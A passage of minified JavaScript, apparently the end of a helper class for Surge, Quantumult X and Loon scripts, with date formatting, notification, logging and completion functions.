			/(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
			for (let e in i)
				new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
			return t
		}
		msg(e = t, s = "", i = "", r) {
			const o = t => {
				if (!t)
					return t;
				if ("string" == typeof t)
					return this.isLoon() ? t : this.isQuanX() ? {
						"open-url": t
					}
				 : this.isSurge() ? {
					url: t
				}
				 : void 0;
				if ("object" == typeof t) {
					if (this.isLoon()) {
						let e = t.openUrl || t.url || t["open-url"],
						s = t.mediaUrl || t["media-url"];
						return {
							openUrl: e,
							mediaUrl: s
						}
					}
					if (this.isQuanX()) {
						let e = t["open-url"] || t.url || t.openUrl,
						s = t["media-url"] || t.mediaUrl;
						return {
							"open-url": e,
							"media-url": s
						}
					}
					if (this.isSurge()) {
						let e = t.url || t.openUrl || t["open-url"];
						return {
							url: e
						}
					}
				}
			};
			if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
				let t = ["", "==============📣系统通知📣=============="];
				t.push(e),
				s && t.push(s),
				i && t.push(i),
				console.log(t.join("\n")),
				this.logs = this.logs.concat(t)
			}
		}
		log(...t) {
			t.length > 0 && (this.logs = [...this.logs, ...t]),
			console.log(t.join(this.logSeparator))
		}
		logErr(t, e) {
			const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
			s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
		}
		wait(t) {
			return new Promise(e => setTimeout(e, t))
		}
		done(t = {}) {
			const e = (new Date).getTime(),
			s = (e - this.startTime) / 1e3;
			this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`),
			this.log(),
			(this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
		}
	}
	(t, e)
}
